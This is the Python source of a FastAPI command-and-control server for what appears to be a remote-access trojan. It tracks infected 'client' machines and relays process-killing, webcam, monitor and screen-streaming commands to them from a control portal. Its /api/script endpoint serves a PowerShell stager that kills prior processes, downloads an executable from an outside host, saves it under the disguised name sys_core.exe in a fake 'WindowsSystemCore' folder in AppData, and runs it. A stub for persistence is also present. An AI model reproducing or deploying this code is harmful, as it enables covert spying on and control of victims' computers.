import asyncio
import orjson
import os
import sys
import time
import socket
import datetime
import struct
from typing import List, Dict, Set

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, Request
from fastapi.staticfiles import StaticFiles
import uvicorn
from fastapi.responses import HTMLResponse
from aiortc.contrib.media import MediaStreamTrack, MediaRelay

AGENT_VERSION = "9.2.4-IMMORTAL"
app = FastAPI()

def install_persistence():
    pass

RECORDINGS_DIR = "recordings"
REGISTRY_FILE = "devices.json"
RECORDINGS_JSON = os.path.join(RECORDINGS_DIR, "recordings.json")
if not os.path.exists(RECORDINGS_DIR): os.makedirs(RECORDINGS_DIR)

# Broker State
PORTALS: Set[WebSocket] = set()
CLIENTS: Dict[str, WebSocket] = {}
PORTAL_TO_CLIENT: Dict[WebSocket, str] = {}
DEVICE_REGISTRY: Dict[str, dict] = {}

def load_registry():
    global DEVICE_REGISTRY
    if os.path.exists(REGISTRY_FILE):
        try:
            with open(REGISTRY_FILE, "rb") as f:
                DEVICE_REGISTRY = orjson.loads(f.read())
                # Force all to Offline on start
                for dev in DEVICE_REGISTRY.values():
                    dev["status"] = "Offline"
        except: DEVICE_REGISTRY = {}

def save_registry():
    try:
        with open(REGISTRY_FILE, "wb") as f:
            f.write(orjson.dumps(DEVICE_REGISTRY, option=orjson.OPT_INDENT_2))
    except: pass

load_registry()

class ConnectionManager:
    async def connect(self, websocket: WebSocket, client_type: str, client_id: str = None):
        if client_type == "portal":
            PORTALS.add(websocket)
            asyncio.create_task(self.broadcast_devices())
        else:
            CLIENTS[client_id] = websocket
            if client_id not in DEVICE_REGISTRY:
                DEVICE_REGISTRY[client_id] = {"hostname": client_id, "status": "Active", "cpu": 0, "ram": 0, "specs": {}}
            DEVICE_REGISTRY[client_id]["status"] = "Active"
            save_registry()
            asyncio.create_task(self.broadcast_devices())

    async def broadcast_devices(self):
        data = orjson.dumps({
            "t": "devices",
            "data": list(DEVICE_REGISTRY.values())
        }).decode()
        await asyncio.gather(*[
            portal.send_text(data)
            for portal in list(PORTALS)
        ], return_exceptions=True)

    def disconnect(self, websocket: WebSocket):
        if websocket in PORTALS:
            PORTALS.remove(websocket)
            PORTAL_TO_CLIENT.pop(websocket, None)
        else:
            for cid, ws in list(CLIENTS.items()):
                if ws == websocket:
                    CLIENTS.pop(cid)
                    if cid in DEVICE_REGISTRY:
                        DEVICE_REGISTRY[cid]["status"] = "Offline"
                    save_registry()
                    asyncio.create_task(self.broadcast_devices())
                    break

    async def broadcast_text_to_portals(self, data: str, client_id: str = None):
        if not client_id: return
        await asyncio.gather(*[
            portal.send_text(data)
            for portal in list(PORTALS)
            if PORTAL_TO_CLIENT.get(portal) == client_id
        ], return_exceptions=True)

    async def broadcast_to_portals(self, data: bytes, client_id: str = None):
        if not client_id: return
        await asyncio.gather(*[
            portal.send_bytes(data)
            for portal in list(PORTALS)
            if PORTAL_TO_CLIENT.get(portal) == client_id
        ], return_exceptions=True)

    async def send_to_client(self, client_id: str, data: dict):
        client_ws = CLIENTS.get(client_id)
        if client_ws:
            try: await client_ws.send_json(data)
            except: pass

manager = ConnectionManager()

@app.get("/api/devices")
async def list_devices():
    return list(DEVICE_REGISTRY.values())

@app.get("/", response_class=HTMLResponse)
async def get_index():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.get("/api/script")
def get_script():
    ps1 = f"""
$exeUrl = "https://web-production-d6db5.up.railway.app/api/client_exe"
$targetDir = "$env:APPDATA\\WindowsSystemCore"
$targetExe = "$targetDir\\sys_core.exe"
$backupExe = "$targetDir\\sys_core_old.exe"

# --- Aggressive Termination ---
taskkill /F /IM sys_core.exe /T 2>$null
taskkill /F /IM mrl_agent.exe /T 2>$null
Start-Sleep -Seconds 3

# --- File Lock Bypass Sequence ---
if (Test-Path -Path $targetExe) {{
    Remove-Item -Path $backupExe -Force -ErrorAction SilentlyContinue 
    Move-Item -Path $targetExe -Destination $backupExe -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $targetExe -Force -ErrorAction SilentlyContinue
}}

if (-not (Test-Path -Path $targetDir)) {{ New-Item -ItemType Directory -Path $targetDir -Force }}

Write-Host "Downloading Core Engine... Please wait (~90MB)" -ForegroundColor Cyan
Invoke-WebRequest -Uri $exeUrl -OutFile $targetExe -UseBasicParsing -ErrorAction Stop

Write-Host "Initializing Bootloader Sequence..." -ForegroundColor Green
Start-Process -FilePath $targetExe
"""
    return Response(content=ps1, media_type="text/plain")

@app.get("/api/client_exe")
async def get_client_exe():
    with open("mrl_agent.exe", "rb") as f:
        return Response(content=f.read(), media_type="application/octet-stream")

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_type = "portal"
    client_id = None
    try:
        raw_msg = await websocket.receive()
        if "text" in raw_msg: handshake = orjson.loads(raw_msg["text"])
        elif "bytes" in raw_msg: handshake = orjson.loads(raw_msg["bytes"])
        else: return

        if handshake.get("type") == "client_auth":
            client_type = "client"
            client_id = str(handshake.get("id", "Unknown"))
            specs = handshake.get("specs", {})
            if client_id in DEVICE_REGISTRY:
                DEVICE_REGISTRY[client_id].update(specs)
            else:
                DEVICE_REGISTRY[client_id] = {"hostname": client_id, "status": "Active", "cpu": specs.get("cpu", "0"), "ram": specs.get("ram", "0"), "specs": specs}
            
            DEVICE_REGISTRY[client_id]["status"] = "Active"
            
            # Announce server version for OTA auto-updates
            try: await websocket.send_text(orjson.dumps({"t": "welcome", "version": AGENT_VERSION}).decode())
            except: pass
        
        await manager.connect(websocket, client_type, client_id)
        
        while True:
            if client_type == "portal":
                data = await websocket.receive_text()
                event = orjson.loads(data)
                if event["t"] == "select_device":
                    PORTAL_TO_CLIENT[websocket] = str(event["id"])
                elif event["t"] in ("rtc_offer", "rtc_ice", "get_processes", "kill_process", "select_monitor", "toggle_webcam", "set_quality", "set_fps"):
                    target = PORTAL_TO_CLIENT.get(websocket)
                    if target: await manager.send_to_client(target, event)
            else:
                raw = await websocket.receive()
                if "text" in raw:
                    event = orjson.loads(raw["text"])
                    await manager.broadcast_text_to_portals(orjson.dumps(event).decode(), client_id)
                elif "bytes" in raw:
                    data = raw["bytes"]
                    if data[0] == 5: # Stats
                        stats = orjson.loads(data[2:])
                        if client_id in DEVICE_REGISTRY: DEVICE_REGISTRY[client_id].update(stats)
                    await manager.broadcast_to_portals(data, client_id)
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        manager.disconnect(websocket)

app.mount("/recordings", StaticFiles(directory=RECORDINGS_DIR), name="recordings")
app.mount("/", StaticFiles(directory=".", html=True), name="static")

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
